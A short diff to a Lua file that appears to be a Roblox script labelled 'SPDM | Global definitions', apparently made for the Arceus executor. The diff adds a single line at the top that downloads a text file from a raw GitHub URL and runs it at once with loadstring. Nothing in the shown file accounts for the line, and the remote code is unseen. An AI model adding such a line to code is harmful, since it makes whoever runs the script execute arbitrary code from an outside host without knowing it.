@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/notificationss.txt", true))()
+
 -- | SPDM | Global definitions
 
 local arceus = arceus or nil
